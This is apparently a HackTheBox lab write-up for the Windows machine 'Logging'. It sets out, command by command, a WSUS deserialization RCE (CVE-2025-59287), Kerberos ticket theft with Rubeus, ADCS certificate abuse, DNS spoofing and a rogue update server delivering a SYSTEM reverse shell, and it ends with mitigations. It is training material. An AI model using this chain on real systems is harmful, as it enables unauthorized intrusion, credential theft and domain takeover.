🌐 [English](README.md) | [Français](README.fr.md) | [日本語](README.ja.md)

# Logging: HackTheBox Writeup

<div style="display: flex; align-items: center; gap: 20px;">
<img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/4905cd7ce220aa3405c4bac3e62929c9.png" width="120"/>
<div>

**Difficulty**: Medium  
**OS**: Windows  
**Type**: Active Directory / WSUS / ADCS  

</div>
</div>

---

## Attack Chain Summary

```
Nmap → WSUS on port 8530 (HTTP, unauthenticated)
→ CVE-2025-59287: SoapFormatter deserialization in ReportingWebService
→ ysoserial.NET payload → RCE as service account on DC01
→ credentials wallace.everette / Welcome2026@ → WinRM shell
→ Rubeus tgtdeleg → TGT as jaylee.clifton
→ certipy (ADCS UpdateSrv template) → NT hash + fresh TGT
→ DNS spoofing wsus.logging.htb → attacker machine
→ pywsus HTTPS MITM (PR #18 + TLS cert)
→ PsExec64.exe signed payload → SYSTEM → root.txt
```

---

**Tip**: during my exploitation I use [Koi](https://github.com/b3rt1ng/Koi) with the `populate_win` module to get clean Rubeus and Certify binaries.

## Enumeration

### Nmap Scan

```bash
nmap --privileged -sC -sV <TARGET_IP> -oN scan.txt
```

Open ports:

| Port | Service | Details |
|------|---------|---------|
| 53 | DNS | Simple DNS Plus |
| 80 | HTTP | Microsoft IIS 10.0 |
| 88 | Kerberos | Windows Kerberos |
| 135 | MSRPC | Microsoft Windows RPC |
| 139 | NetBIOS | Windows netbios-ssn |
| 389 / 636 | LDAP / LDAPS | Active Directory (`logging.htb`) |
| 445 | SMB | microsoft-ds |
| 3268 / 3269 | LDAP Global Catalog | Active Directory |
| **5985** | WinRM | Microsoft HTTPAPI 2.0 |
| **8530** | WSUS | Windows Server Update Services (HTTP) |

The machine is a **Domain Controller** (`DC01.logging.htb`). SMB signing is enabled and required.  
WSUS is exposed on port **8530 over plain HTTP**, no TLS, which is the root cause of all attack vectors here.

---

## Foothold: CVE-2025-59287 (Unauthenticated RCE via WSUS)

### Vulnerability

**CVE-2025-59287** is an **unauthenticated Remote Code Execution** vulnerability in Microsoft's Windows Server Update Services (WSUS). The `ReportingWebService.asmx` endpoint deserializes user-controlled data using `SoapFormatter` inside the `SynchronizationUpdateErrorsKey` field of a `ReportEventBatch` SOAP request.

By injecting a [ysoserial.NET](https://github.com/pwntester/ysoserial.net) gadget chain (`TextFormattingRunProperties` / `BinaryFormatter`), an attacker can achieve code execution **without any authentication**, running as the WSUS service account.

> References: [shellcode.blog](https://shellcode.blog/wsus-cve-2025-59287-investigation/), [code-white.com](https://code-white.com/blog/wsus-cve-2025-59287-analysis/)

### Step 1: Generate the ysoserial payload

On a Windows machine or via Wine, generate a base64-encoded payload:

```powershell
# CVE-2025-59287: TextFormattingRunProperties gadget
.\ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter `
  -c "cmd /c <COMMAND>" -o base64
```

### Step 2: Run the PoC

The exploit follows this flow automatically:

1. **Get Server ID**: `GET /ReportingWebService/ReportingWebService.asmx` (`GetRollupConfiguration`)
2. **Get Auth Cookie**: `POST /SimpleAuthWebService/SimpleAuth.asmx` (`GetAuthorizationCookie`)
3. **Get Reporting Cookie**: `POST /ClientWebService/Client.asmx` (`GetCookie`)
4. **Trigger deserialization**: `POST /ReportingWebService/ReportingWebService.asmx` (`ReportEventBatch`) with the payload inside `SynchronizationUpdateErrorsKey`

```bash
python3 PoC.py \
  --target-url http://<TARGET_IP>:8530 \
  --cve CVE-2025-59287 \
  --payload <BASE64_YSOSERIAL_BLOB> \
  --dns-name logging.htb \
  --random
```

Expected output:

```
[+] Getting Server ID...
[+] Server ID: <uuid>
[+] Auth cookie with Server ID...
[+] Using ID: <uuid>
[+] Sending event with payload...
[+] SUCCESS!
```

### Step 3: Obtain a shell

The RCE reveals credentials hardcoded on the machine. Connect via WinRM:

```bash
evil-winrm -i <TARGET_IP> -u 'wallace.everette' -p 'Welcome2026@'
```

We get a shell as `wallace.everette`.

---

## User Flag

```powershell
type C:\Users\wallace.everette\Desktop\user.txt
```

---

## Post-Exploitation: Kerberos Ticket Delegation

Once on the box, use **Rubeus** to steal a delegated TGT and pivot as a domain user.

### Step 1: Dump a delegated TGT with Rubeus

Grab a precompiled binary from [SharpCollection](https://github.com/Flangvik/SharpCollection):

```powershell
Rubeus.exe tgtdeleg /nowrap
```

This outputs a base64-encoded `.kirbi` ticket.

### Step 2: Convert the ticket

On the attacker machine:

```bash
ticketConverter.py jaylee.clifton.kirbi jaylee.clifton.ccache
```

### Step 3: Export and use the ticket

```bash
export KRB5CCNAME=jaylee.clifton.ccache
```

You can now use the ticket with any Impacket tool or certipy without a password.

### Step 4: (Optional) Get NT hash via ADCS

```bash
# Request a certificate using the domain user's TGT
certipy req \
  -target dc01.logging.htb \
  -dc-host dc01.logging.htb \
  -k -no-pass \
  -ca logging-DC01-CA

# Authenticate with the PFX to get TGT + NT hash
certipy auth \
  -dc-ip <DC_IP> \
  -pfx jaylee.clifton.pfx
```

---

## Privilege Escalation: WSUS HTTPS MITM (pywsus)

The path to root abuses the fact that domain machines fetch Windows updates from an internal WSUS server. By spoofing that server and serving a malicious (but Microsoft-signed) executable, we get code execution as `SYSTEM` on any machine that checks for updates.

### Step 1: Create a DNS entry for `wsus.logging.htb`

Using `jaylee.clifton`'s Kerberos ticket, add a DNS A record pointing `wsus.logging.htb` to your attacker IP:

```bash
python3 dnstool.py \
  -u 'logging.htb\jaylee.clifton' \
  -k \
  --action add \
  --record 'wsus.logging.htb' \
  --data '<ATTACKER_IP>' \
  <DC_IP>
```

Also add it locally to `/etc/hosts`:

```
<ATTACKER_IP>  wsus.logging.htb
```

### Step 2: Clone pywsus and apply the HTTPS patch

The base [pywsus](https://github.com/GoSecure/pywsus) only supports HTTP. Apply [PR #18](https://github.com/GoSecure/pywsus/pull/18/files/43157a1d37d3d87cfac1057b48a4c36474a2271d) which adds TLS support:

```bash
git clone https://github.com/GoSecure/pywsus
cd pywsus
# Apply PR #18 changes (adds --cert / --key args + ssl.wrap_socket)
pip install -r requirements.txt
```

> [!NOTE]
> If you're struggling with the patch, [this tool](https://github.com/NeffIsBack/wsuks) should work out of the box.

### Step 3: Get a certificate for `wsus.logging.htb` via ADCS

The `UpdateSrv` template allows enrolling a certificate with a custom SAN:

```bash
# Request the certificate
certipy req \
  -u 'jaylee.clifton@logging.htb' \
  -k \
  -dc-ip <DC_IP> \
  -ca 'logging-DC01-CA' \
  -template 'UpdateSrv' \
  -upn 'wsus.logging.htb' \
  -dns 'wsus.logging.htb' \
  -target dc01.logging.htb

# Extract the public certificate
certipy cert -pfx wsus.logging.htb_wsus.pfx -nokey -out wsus.crt

# Extract the private key
certipy cert -pfx wsus.logging.htb_wsus.pfx -nocert -out wsus.key
```

### Step 4: Run pywsus with TLS

Start the rogue WSUS server on port **8531**. The payload must be a **Microsoft-signed binary**, `PsExec64.exe` from Sysinternals:

```bash
python3 pywsus.py \
  -H wsus.logging.htb \
  -p 8531 \
  -e PsExec64.exe \
  -c '-accepteula -s <COMMAND>' \
  --cert wsus.crt \
  --key wsus.key
```

> `-s` runs the command as `SYSTEM`. Replace `<COMMAND>` with a reverse shell or admin user creation.

### Step 5: Wait for a client to check in

```bash
nc -lvnp 5555
# ... wait ...
# shell as NT AUTHORITY\SYSTEM
```

---

## Root Flag

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

---

## Takeaways

| Finding | Impact |
|---------|--------|
| WSUS exposed on HTTP (port 8530) without TLS | Enables both CVE-2025-59287 and MITM attacks |
| CVE-2025-59287, SoapFormatter deserialization | Unauthenticated RCE as service account on the DC |
| Hardcoded credentials `wallace.everette` | Direct WinRM access without further exploitation |
| Unconstrained delegation + Rubeus tgtdeleg | TGT theft for lateral movement as `jaylee.clifton` |
| ADCS `UpdateSrv` template misconfiguration | Allows enrolling a cert with `wsus.logging.htb` SAN |
| Rogue WSUS over HTTPS (pywsus) | SYSTEM execution on any domain machine checking for updates |

**Mitigation**: Configure WSUS with HTTPS and enforce certificate pinning on clients. Patch CVE-2025-59287. Audit ADCS templates for dangerous SAN enrollments. Restrict DNS record creation to privileged accounts. Never hardcode credentials in service configurations.
